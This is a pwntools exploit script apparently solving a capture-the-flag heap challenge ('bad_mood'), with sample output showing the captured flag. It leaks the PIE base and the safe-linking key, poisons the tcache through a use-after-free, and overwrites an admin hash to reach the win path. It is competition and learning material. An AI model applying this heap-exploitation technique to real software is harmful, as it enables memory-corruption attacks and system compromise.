#!/usr/bin/env python3
from pwn import *

HOST, PORT = "ctf.mf.grsu.by", 9073
exe = ELF("./bad_mood_patched")
context.binary = exe

# PIE-relative offsets from symtab
ADMINHASH_OFF = 0x40c0
RODATA_PAGE_OFF = 0x2000

def fnv1a_64(bs: bytes) -> int:
    """FNV-1a 64-bit hash (same as used in the binary)"""
    h = 0xcbf29ce484222325
    for b in bs:
        h ^= b
        h = (h * 0x100000001b3) & 0xffffffffffffffff
    return h

def conn():
    if args.LOCAL:
        return process([exe.path])
    return remote(HOST, PORT)

def alloc(r, idx: int, data: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendafter(b"Data: ", data.ljust(0x60, b"\x00"))

def free_(r, idx: int):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Index: ", str(idx).encode())

def edit(r, idx: int, data: bytes):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendafter(b"Data: ", data.ljust(0x60, b"\x00"))

def read_(r, idx: int) -> bytes:
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"Index: ", str(idx).encode())
    blob = r.recvn(0x68)
    r.recvuntil(b"\n")
    return blob

def main():
    r = conn()

    # Step 1: Leak PIE base via DEFAULTTAG pointer
    alloc(r, 0, b"A"*8)
    leak = read_(r, 0)
    leak_tag_ptr = u64(leak[0x60:0x68])
    
    pie = (leak_tag_ptr & ~0xfff) - RODATA_PAGE_OFF
    adminhash_addr = pie + ADMINHASH_OFF
    
    log.info(f"Leaked tag ptr  = {hex(leak_tag_ptr)}")
    log.info(f"PIE base        = {hex(pie)}")
    log.info(f"adminhash addr  = {hex(adminhash_addr)}")

    # Step 2: Get safe-linking key
    alloc(r, 1, b"B"*8)
    alloc(r, 2, b"C"*8)
    
    free_(r, 1)
    leak1 = read_(r, 1)
    key = u64(leak1[0:8])
    log.info(f"Safe-link key   = {hex(key)}")

    # Step 3: Take chunk back
    alloc(r, 1, b"D"*8)

    # Step 4: Make tcache count = 2
    free_(r, 2)
    free_(r, 1)

    # Step 5: Poison tcache
    edit(r, 1, p64(adminhash_addr ^ key))

    # Step 6: Get arbitrary write to adminhash
    alloc(r, 3, b"E"*8)
    want = fnv1a_64(b"NOPE")
    log.info(f"hash('NOPE')    = {hex(want)}")
    alloc(r, 4, p64(want))

    # Step 7: Win
    r.sendlineafter(b"> ", b"5")
    r.interactive()

if __name__ == "__main__":
    main()


# After running the program, you will see a result similar to this.
# └─$ python3 solve.py
# [*] '/home/ctf/Downloads/Bad mood/bad_mood_patched'
#     Arch:       amd64-64-little
#     RELRO:      Full RELRO
#     Stack:      Canary found
#     NX:         NX enabled
#     PIE:        PIE enabled
#     RUNPATH:    b'$ORIGIN'
#     Stripped:   No
# [+] Opening connection to ctf.mf.grsu.by on port 9073: Done
# [*] Leaked tag ptr  = 0x560d369d0008
# [*] PIE base        = 0x560d369ce000
# [*] adminhash addr  = 0x560d369d20c0
# [*] Safe-link key   = 0x560d55c61
# [*] hash('NOPE')    = 0x50dcdcc6356078e1
# [*] Switching to interactive mode
# grodno{V4S1LL1Y_248YV437_K70_0N_3S7_P070mySh70_74SK4_SL0m4n4}
# [*] Got EOF while reading in interactive
# $